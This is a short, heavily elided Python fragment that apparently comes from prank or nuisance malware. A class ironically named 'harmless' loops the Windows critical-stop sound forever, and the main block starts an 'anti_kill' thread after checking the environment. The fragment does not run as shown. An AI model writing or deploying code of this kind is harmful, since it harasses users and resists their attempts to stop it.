...
class harmless:
    ...
    def sound(self):
        ...
        while 1:
            try:
                playsound("Windows Critical Stop.wav")
            except Exception:
                pass
...
if __name__ == "__main__":
    ...
    if hasattr(sys, "real_prefix"):
        ...
        if anti_kill == True:
            anti_kill_thread = threading.Thread(
                target=events.anti_kill, name="check for kill"
            ).start()
